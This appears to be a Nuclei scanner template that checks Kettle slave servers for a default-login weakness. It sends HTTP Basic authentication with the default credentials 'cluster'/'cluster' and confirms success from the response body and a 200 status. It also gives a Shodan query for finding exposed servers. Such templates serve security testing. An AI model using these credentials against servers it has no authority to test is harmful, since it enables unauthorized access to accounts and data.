id: kettle-default-login

info:
  name: Kettle - Default Login
  author: For3stCo1d
  severity: medium
  description: Kettle contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
  classification:
    cpe: cpe:2.3:a:kettle:kettle:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N
    cvss-score: 5.8
    cwe-id: CWE-522
  metadata:
    verified: true
    max-request: 1
    shodan-query: basic realm="Kettle"
    vendor: kettle
    product: kettle
  tags: default-login,kettle,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    headers:
      Authorization: "Basic {{base64(username + ':' + password)}}"

    attack: pitchfork
    payloads:
      username:
        - cluster
      password:
        - cluster

    matchers-condition: and
    matchers:
      - type: word
        name: kettle
        cpe: cpe:2.3:a:kettle:kettle:*:*:*:*:*:*:*:*
        part: body
        words:
          - 'Kettle slave server'

      - type: status
        status:
          - 200
